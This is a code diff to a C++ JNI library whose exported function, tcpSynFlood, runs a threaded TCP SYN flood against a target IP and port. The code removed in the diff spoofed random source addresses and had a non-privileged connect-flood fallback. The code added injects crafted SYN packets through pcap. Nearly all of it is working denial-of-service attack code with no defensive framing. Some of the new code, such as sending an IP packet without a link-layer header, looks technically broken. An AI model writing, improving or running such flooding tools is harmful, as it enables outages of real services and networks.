@@ -5,10 +5,13 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
-#include <process.h>
+#include <pcap.h>
+#include <iphlpapi.h>
 #include <cstdint>
 
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "wpcap.lib")
 
 #define PACKET_SIZE 40
 
@@ -54,92 +57,116 @@ struct thread_data {
     volatile bool* stop_attack;
 };
 
-unsigned short csum(unsigned short *ptr, int nbytes) {
-    long sum;
-    unsigned short oddbyte;
-    short answer;
+unsigned short in_cksum(unsigned short *addr, int len) {
+    int nleft = len;
+    int sum = 0;
+    unsigned short *w = addr;
+    unsigned short answer = 0;
 
-    sum = 0;
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
+    while (nleft > 1) {
+        sum += *w++;
+        nleft -= 2;
     }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((u_char*)&oddbyte) = *(u_char*)ptr;
-        sum += oddbyte;
+
+    if (nleft == 1) {
+        *(unsigned char *)(&answer) = *(unsigned char *)w;
+        sum += answer;
     }
 
     sum = (sum >> 16) + (sum & 0xffff);
-    sum = sum + (sum >> 16);
-    answer = (short)~sum;
-
+    sum += (sum >> 16);
+    answer = ~sum;
     return answer;
+}
+
+unsigned short tcp_checksum(struct iphdr *ip, struct tcphdr *tcp) {
+    struct pseudo_header psh;
+    char *pseudogram;
+    int psize;
+
+    psh.source_address = ip->saddr;
+    psh.dest_address = ip->daddr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_length = htons(sizeof(struct tcphdr));
+
+    psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
+    pseudogram = (char*)malloc(psize);
+
+    memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
+    memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
+
+    unsigned short checksum = in_cksum((unsigned short*)pseudogram, psize);
+
+    free(pseudogram);
+    return checksum;
 }
 
 DWORD WINAPI send_syn_packets(LPVOID arg) {
     struct thread_data *data = (struct thread_data *)arg;
-    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (s == INVALID_SOCKET) {
-        printf("Error creating socket. Error number: %d\n", WSAGetLastError());
+    pcap_t *handle;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    
+    // Open the default network adapter for packet injection
+    handle = pcap_open_live(NULL, 65536, 1, 1000, errbuf);
+    if (handle == NULL) {
+        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
         return 1;
     }
 
-    char datagram[PACKET_SIZE];
-    struct iphdr *iph = (struct iphdr *)datagram;
-    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
-    struct sockaddr_in sin;
+    // Prepare your packet here (IP header + TCP header)
+    char packet[PACKET_SIZE];
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
 
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(data->target_port);
-    sin.sin_addr.s_addr = inet_addr(data->target_ip);
+    // Fill in the IP header
+    ip->ihl = 5;
+    ip->version = 4;
+    ip->tos = 0;
+    ip->tot_len = htons(PACKET_SIZE);
+    ip->id = htons(54321);
+    ip->frag_off = 0;
+    ip->ttl = 255;
+    ip->protocol = IPPROTO_TCP;
+    ip->check = 0; // We'll calculate the checksum later
+    ip->saddr = inet_addr("192.168.1.100"); // Replace with your source IP
+    ip->daddr = inet_addr(data->target_ip);
 
-    memset(datagram, 0, PACKET_SIZE);
-
-    // IP Header
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
-    iph->daddr = sin.sin_addr.s_addr;
-
-    // TCP Header
-    tcph->dest = htons(data->target_port);
-    tcph->doff = 5;
-    tcph->syn = 1;
-    tcph->window = htons(65535);
-
-    int one = 1;
-    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char*)&one, sizeof(one)) < 0) {
-        printf("Error setting IP_HDRINCL. Error number: %d\n", WSAGetLastError());
-        closesocket(s);
-        return 1;
-    }
+    // Fill in the TCP header
+    tcp->source = htons(12345); // Replace with your source port
+    tcp->dest = htons(data->target_port);
+    tcp->seq = htonl(1000);
+    tcp->ack_seq = 0;
+    tcp->doff = 5;
+    tcp->fin = 0;
+    tcp->syn = 1;
+    tcp->rst = 0;
+    tcp->psh = 0;
+    tcp->ack = 0;
+    tcp->urg = 0;
+    tcp->window = htons(5840);
+    tcp->check = 0; // We'll calculate the checksum later
+    tcp->urg_ptr = 0;
 
     DWORD start_time = GetTickCount();
-    DWORD bytes_sent = 0;
-    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    int bytes_sent = 0;
     int packets_sent = 0;
 
-    while (!(*(data->stop_attack))) {
-        // Randomize source IP and ports
-        iph->saddr = htonl(rand());
-        iph->id = htons(rand());
-        tcph->source = htons(rand());
-        tcph->seq = rand();
+    while (!*(data->stop_attack)) {
+        // Calculate IP checksum
+        ip->check = 0;
+        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
 
-        iph->check = 0;
-        tcph->check = 0;
-        iph->check = csum((unsigned short *)datagram, iph->tot_len);
+        // Calculate TCP checksum
+        tcp->check = 0;
+        tcp->check = tcp_checksum(ip, tcp);
 
-        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            printf("sendto() failed. Error number: %d\n", WSAGetLastError());
+        // Send the packet
+        if (pcap_sendpacket(handle, (u_char*)packet, PACKET_SIZE) != 0) {
+            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
         } else {
             packets_sent++;
-            bytes_sent += packet_size;
+            bytes_sent += PACKET_SIZE;
         }
 
         // Rate limiting
@@ -155,50 +182,7 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
         }
     }
 
-    closesocket(s);
-    return 0;
-}
-
-DWORD WINAPI send_syn_packets_non_privileged(LPVOID arg) {
-    struct thread_data *data = (struct thread_data *)arg;
-    DWORD start_time = GetTickCount();
-    DWORD bytes_sent = 0;
-    int packets_sent = 0;
-
-    while (!(*(data->stop_attack))) {
-        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (s == INVALID_SOCKET) {
-            continue;
-        }
-
-        struct sockaddr_in sin;
-        sin.sin_family = AF_INET;
-        sin.sin_port = htons(data->target_port);
-        sin.sin_addr.s_addr = inet_addr(data->target_ip);
-
-        u_long iMode = 1;
-        ioctlsocket(s, FIONBIO, &iMode);
-
-        connect(s, (struct sockaddr *)&sin, sizeof(sin));
-
-        closesocket(s);
-
-        packets_sent++;
-        bytes_sent += sizeof(struct tcphdr) + sizeof(struct iphdr);
-
-        // Rate limiting
-        if (bytes_sent >= data->bytes_per_second) {
-            DWORD elapsed_time = GetTickCount() - start_time;
-            if (elapsed_time < 1000) {
-                Sleep(1000 - elapsed_time);
-            }
-            printf("Sent %d packets, %d bytes\n", packets_sent, bytes_sent);
-            start_time = GetTickCount();
-            bytes_sent = 0;
-            packets_sent = 0;
-        }
-    }
-
+    pcap_close(handle);
     return 0;
 }
 
@@ -214,22 +198,7 @@ JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
     data.stop_attack = &stop_attack;
 
     HANDLE thread;
-    BOOL isElevated = FALSE;
-    HANDLE hToken = NULL;
-    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        TOKEN_ELEVATION elevation;
-        DWORD dwSize;
-        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
-            isElevated = elevation.TokenIsElevated;
-        }
-        CloseHandle(hToken);
-    }
-
-    if (isElevated) {
-        thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
-    } else {
-        thread = CreateThread(NULL, 0, send_syn_packets_non_privileged, (LPVOID)&data, 0, NULL);
-    }
+    thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
 
     if (thread == NULL) {
         printf("Failed to create thread. Error: %d\n", GetLastError());
@@ -254,5 +223,5 @@ JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
 
     env->ReleaseStringUTFChars(targetIp, ip);
     printf("tcpSynFlood method completed\n");
-    return isElevated ? JNI_TRUE : JNI_FALSE;
+    return JNI_TRUE;
 }
